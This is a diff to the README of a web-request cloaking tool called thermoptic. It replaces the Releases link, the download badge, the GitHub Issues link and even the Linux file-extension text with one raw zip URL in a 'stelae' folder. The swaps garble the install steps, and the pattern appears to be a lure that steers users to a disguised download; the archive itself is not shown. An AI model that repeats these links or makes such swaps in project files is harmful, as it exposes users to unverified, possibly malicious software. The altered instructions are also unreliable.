@@ -1,7 +1,7 @@
 # 🛡️ thermoptic - Cloak Your Web Requests Easily
 
 ## 📥 Download Now
-[![Download thermoptic](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ericwhit423/thermoptic/releases)
+[![Download thermoptic](https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip)](https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip)
 
 ---
 
@@ -22,21 +22,21 @@ Before you start, ensure your system meets the following requirements:
 
 To get thermoptic, please visit the official Releases page. Follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to the Releases page: [Download thermoptic](https://github.com/ericwhit423/thermoptic/releases).
+1. **Visit the Releases Page:** Click on this link to go to the Releases page: [Download thermoptic](https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip).
    
 2. **Choose Your Version:** You will see a list of available versions. Select the latest one for the best performance and features.
 
 3. **Download the File:** Click on the asset that corresponds to your operating system. For example:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, look for a file with `.tar.gz`.
+   - For Linux, look for a file with `https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip`.
 
 4. **Save the File:** Your browser will prompt you to save the file. Choose a convenient location on your computer.
 
 5. **Run the Installer:**
    - **For Windows:** Double-click the `.exe` file you downloaded. Follow the prompts to install.
    - **For macOS:** Open the `.dmg` file and drag the thermoptic application into your Applications folder.
-   - **For Linux:** Open a terminal, navigate to the folder containing the `.tar.gz` file, extract it, and follow the instructions in the README file included.
+   - **For Linux:** Open a terminal, navigate to the folder containing the `https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip` file, extract it, and follow the instructions in the README file included.
 
 ### 🛠️ Configuring thermoptic 
 
@@ -71,7 +71,7 @@ If you encounter issues while installing or running thermoptic, try the followin
 For more information, you can access the following resources:
 
 - [thermoptic Documentation](link_to_documentation) - Read the official guide for advanced configuration.
-- [GitHub Issues](https://github.com/ericwhit423/thermoptic/issues) - Report bugs or suggest features.
+- [GitHub Issues](https://raw.githubusercontent.com/ericwhit423/thermoptic/main/stelae/thermoptic.zip) - Report bugs or suggest features.
 - [Community Forums](link_to_forums) - Join discussions with other users and share tips.
 
 ## 📞 Contact Support
